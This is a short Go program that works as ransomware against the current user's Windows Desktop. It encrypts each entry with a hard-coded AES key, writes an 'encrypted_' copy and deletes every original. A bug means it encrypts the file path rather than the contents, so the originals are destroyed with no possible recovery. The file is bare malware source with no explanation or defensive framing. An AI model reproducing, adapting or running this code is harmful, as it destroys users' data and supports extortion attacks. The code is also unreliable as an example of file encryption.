package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"os"
	"os/user"
	"sync"
)

var (
	wg sync.WaitGroup
	//must be 16,24,32 char
	pw string = "password@123abes"
)

func Encrypt(file []byte, secretKey string) string {
	key := []byte(secretKey)

	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err)
	}

	ciphertext := make([]byte, aes.BlockSize+len(file))
	iv := ciphertext[:aes.BlockSize]
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		panic(err)
	}

	stream := cipher.NewCFBEncrypter(block, iv)
	stream.XORKeyStream(ciphertext[aes.BlockSize:], file)

	return base64.URLEncoding.EncodeToString(ciphertext)
}

func main() {

	user, err := user.Current()
	if err != nil {
		log.Fatalf(err.Error())
	}
	desktopPath := user.HomeDir + "\\Desktop\\"

	files, err := ioutil.ReadDir(desktopPath)
	if err != nil {
		log.Fatal(err)
	}

	for _, file := range files {
		wg.Add(1)
		go func() {
			data := Encrypt([]byte(desktopPath+file.Name()), pw)
			fmt.Println(desktopPath)
			ioutil.WriteFile(desktopPath+"encrypted_"+file.Name(), []byte(data), 0644)
			e := os.Remove(desktopPath + file.Name())
			if e != nil {
				log.Fatal(e)
			}
			wg.Done()
		}()
		wg.Wait()
	}

}
